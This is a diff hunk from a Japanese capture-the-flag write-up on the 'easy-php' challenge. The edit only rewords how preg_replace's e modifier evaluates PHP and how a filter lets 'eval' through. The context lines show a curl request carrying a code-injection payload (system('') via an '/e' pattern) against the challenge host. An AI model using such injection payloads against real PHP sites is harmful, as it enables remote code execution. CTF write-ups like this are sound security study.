@@ -19,8 +19,8 @@ $ curl http://easy-php.darkarmy.xyz/robots.txt
 謎のクエリパラメータが出てくるので、指定しアクセスすると以下のようなソースが見られた。  
 ?lmao  
 [site.png](site/site.png)  
-`preg_replace`が用いられているが、e修飾子によって第二引数がphpコードとして評価されることが知られている。  
-`is_payload_danger`によってある程度はじかれるようだが、`eval`は通るようだ。  
+`preg_replace`が用いられているが、この関数はe修飾子によって第二引数がphpコードとして評価されることが知られている。  
+`is_payload_danger`によってある程度弾いているが、`eval`は通るようだ。  
 ```bash
 $ curl "http://easy-php.darkarmy.xyz/?bruh=system('')&nic3=/a/e"
 Amazing Goob JOb You :) 
